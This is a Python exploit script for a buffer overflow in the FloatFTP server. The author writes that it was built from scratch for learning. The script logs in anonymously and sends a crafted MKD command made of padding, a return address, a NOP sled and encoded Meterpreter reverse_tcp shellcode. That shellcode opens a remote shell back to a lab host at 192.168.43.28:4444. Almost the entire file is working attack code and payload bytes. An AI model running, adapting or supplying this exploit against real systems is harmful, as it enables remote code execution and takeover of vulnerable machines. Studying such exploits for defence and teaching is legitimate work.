
#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the buffer overflow vulnerability in FloatFTP. Though it's an old vulnerability and many exploits exist for it.
# I created this from scratch.

import socket
import sys

#Shellcode payload: windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 Bad characters = '\x00\x0A\x0D'

buf =  ""
buf += "\xda\xcd\xd9\x74\x24\xf4\x5e\x31\xc9\xb8\xeb\x9e\xbd"
buf += "\x34\xb1\x56\x83\xee\xfc\x31\x46\x14\x03\x46\xff\x7c"
buf += "\x48\xc8\x17\x02\xb3\x31\xe7\x63\x3d\xd4\xd6\xa3\x59"
buf += "\x9c\x48\x14\x29\xf0\x64\xdf\x7f\xe1\xff\xad\x57\x06"
buf += "\x48\x1b\x8e\x29\x49\x30\xf2\x28\xc9\x4b\x27\x8b\xf0"
buf += "\x83\x3a\xca\x35\xf9\xb7\x9e\xee\x75\x65\x0f\x9b\xc0"
buf += "\xb6\xa4\xd7\xc5\xbe\x59\xaf\xe4\xef\xcf\xa4\xbe\x2f"
buf += "\xf1\x69\xcb\x79\xe9\x6e\xf6\x30\x82\x44\x8c\xc2\x42"
buf += "\x95\x6d\x68\xab\x1a\x9c\x70\xeb\x9c\x7f\x07\x05\xdf"
buf += "\x02\x10\xd2\xa2\xd8\x95\xc1\x04\xaa\x0e\x2e\xb5\x7f"
buf += "\xc8\xa5\xb9\x34\x9e\xe2\xdd\xcb\x73\x99\xd9\x40\x72"
buf += "\x4e\x68\x12\x51\x4a\x31\xc0\xf8\xcb\x9f\xa7\x05\x0b"
buf += "\x40\x17\xa0\x47\x6c\x4c\xd9\x05\xf8\xa1\xd0\xb5\xf8"
buf += "\xad\x63\xc5\xca\x72\xd8\x41\x66\xfa\xc6\x96\xff\xec"
buf += "\xf8\x49\x47\x7c\x07\x6a\xb7\x54\xcc\x3e\xe7\xce\xe5"
buf += "\x3e\x6c\x0f\x09\xeb\x18\x05\x9d\xd4\x74\x32\x41\xbd"
buf += "\x86\x45\x68\x61\x0f\xa3\xda\xc9\x5f\x7c\x9b\xb9\x1f"
buf += "\x2c\x73\xd0\x90\x13\x63\xdb\x7b\x3c\x0e\x34\xd5\x14"
buf += "\xa7\xad\x7c\xee\x56\x31\xab\x8a\x59\xb9\x59\x6a\x17"
buf += "\x4a\x28\x78\x40\x2d\xd2\x80\x91\xd8\xd2\xea\x95\x4a"
buf += "\x85\x82\x97\xab\xe1\x0c\x67\x9e\x72\x4a\x97\x5f\x42"
buf += "\x20\xae\xf5\xea\x5e\xcf\x19\xea\x9e\x99\x73\xea\xf6"
buf += "\x7d\x20\xb9\xe3\x81\xfd\xae\xbf\x17\xfe\x86\x6c\xbf"
buf += "\x96\x24\x4a\xf7\x38\xd7\xb9\x8b\x3f\x27\x3f\xa4\xe7"
buf += "\x4f\xbf\xf4\x17\x8f\xd5\xf4\x47\xe7\x22\xda\x68\xc7"
buf += "\xcb\xf1\x20\x4f\x41\x94\x83\xee\x56\xbd\x42\xae\x57"
buf += "\x32\x5f\x41\x2d\x3b\x60\xa2\xd2\x55\x05\xa3\xd2\x59"
buf += "\x3b\x98\x04\x60\x49\xdf\x94\xd7\x42\x6a\xb8\x7e\xc9"
buf += "\x94\xee\x81\xd8"

nop = "\x90"*20

evil = "A"*247 + "\x59\x54\xC3\x77" + nop + buf + "\x90" * (1000-247-20-len(buf))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.43.72',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD '+evil+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
